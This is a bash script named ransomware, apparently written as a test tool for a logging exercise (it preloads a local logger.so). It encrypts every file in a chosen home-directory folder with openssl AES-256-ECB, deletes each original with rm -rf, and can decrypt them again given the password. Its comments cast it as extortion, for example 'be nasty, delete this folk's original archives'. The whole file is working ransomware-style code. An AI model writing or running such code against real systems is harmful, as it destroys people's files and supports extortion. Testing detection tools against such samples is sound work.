#!/bin/bash



#Exclude root/priviledged from executing, else we're fucked up... 

if  [ $(id -u) = 0 ] || [ -w / ]; then
	echo "Sorry honey, no root is allowed to play with my toys.."
	exit
fi


#Functions are always a nice idea..

function usage()
{
    printf "Usage: \n"
    printf "./ransomware -n <num_of_files> -d <directory>\n"
    printf "\tOR\n"
    printf "./ransomware -e -d <directory> -p <password>\n\n"
    printf "Options: \n"
    printf -- "-n,  --files     Creates <num_of_files> files in <directory>\n"
    printf -- "-e,  --encrypt   Encrypts everything in given <directory> using <password>\n"
    printf -- "-d,  --decrypt   Decrypts everything in given <directory> using <password>\n"
    printf -- "-h,  --help      This help message\n\n"
    printf -- "WARNING: This is a test tool, be careful though, it really \"does\" stuff.\n"

    exit
}

function encrypt()
{

	

	#in case it breaks, exit.. 
	shopt -s nullglob 
	
	#assign as array..
	files=(~/"$dir"/*)

	
	
	#parse and encrypt files..
	for file in "${files[@]}"; do
		
		 openssl enc -aes-256-ecb -pbkdf2 -in $file -out $file.encrypt -k $pass

		 #be nasty, delete this folk's original archives.
		 rm -rf "$file"
	done

	exit
}



function decrypt()
{
	#in case it breaks, exit.. 
	shopt -s nullglob 

	#assign as array..
	files=(~/"$dir"/*)


    for file in "${files[@]}"; do

    	
    	
    	if [[ "$file" == *".encrypt"* ]]; then
    			
    		#remove that boring ".encrypt" suffix from the end and decrypt

        	 openssl enc -d -aes-256-ecb -pbkdf2 -in $file -out  "${file%%.encrypt*}" -k $pass

        	#be polite, the guy paid ransom, remove encrypted
        	rm -rf "$file"
    	fi

      
    done
    exit 0
}


function create_files()
{


	## get in the actual directory.

	cd ~/"$dir"

	# creating demo files, it could be different types gotten random from an array, doesnt matter.
	while [[ "$file_num" -gt '0' ]]; do
		touch "file_$file_num.txt"   # file_1.txt, file_2.txt, etc..
		let "file_num=file_num-1"	 # must move forward, or backward its the same thing afterall..	
	done
	

	exit 
}




if [[ -z $1 ]]; then
	
	echo "Bad usage of script $0"
	
	exit
fi

# assume that a hacker is kind enough to preload ur tool, just for the sake of convenience and for the sake of not daemonizing a non-stable tool.. :)
export LD_PRELOAD=~/Desktop/securious-tuc/logix/src/logger.so 


# control the flow, shift args, get what u want..

while ! [[ -z $1 ]]; do


	if [[ $1 == '-h' ]]; then
		usage
	elif [[ $1 == '-e' ]] && [[ $2 == '-d' ]] && [[ $4 == '-p' ]]; then
		dir="$3"
		pass="$5"
		encrypt
	elif [[ $1 == '-d' ]] && [[ $2 == '-d' ]] && [[ $4 == '-p' ]]; then
		dir="$3"
		pass="$5"
		decrypt
	elif [[ $1 == '-n' ]] && [[ $3 == '-d' ]]; then
		dir=$4
		file_num=$2
		create_files
	else
	
	#nobody made a perfect call at first try, so

		#play a colourful game..
		tput setaf 1;
		echo "Bad usage of script $0 .."
		
		#revert colors.
		tput sgr0; 

		#let him know how to, and exit..
		usage 
		exit

	fi

	shift
done

